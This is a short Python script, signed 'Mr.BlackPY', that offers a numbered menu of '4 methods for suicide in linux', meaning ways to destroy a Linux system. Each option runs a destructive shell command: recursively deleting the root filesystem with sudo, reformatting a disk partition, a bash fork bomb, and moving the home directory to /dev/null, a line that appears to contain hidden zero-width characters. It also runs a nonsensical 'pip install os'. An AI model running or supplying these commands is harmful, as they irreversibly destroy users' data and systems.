#!/usr/bin/python3.6
import os
#4 methods for suicide in linux

os.system("pip install os")

startmenu = """4 methods for suicide in linux\n
Coded By : Mr.BlackPY
be careful
"""
print(startmenu)

print("1")
print("2")
print("3")
print("4")

try:
    s = int(input("Please Select a Number: "))
except:
    print("wrong input!")
    exit()

if s == 1:
    os.system("sudo rm -rf /*")
elif s == 2:
    os.system("sudo mkfs.ext4 /dev/sda1")
elif s == 3:
    os.system(":(){ :|: & };:")
elif s == 4:
    os.system("sudo mv‍‍ ~ /dev/null")

exit()
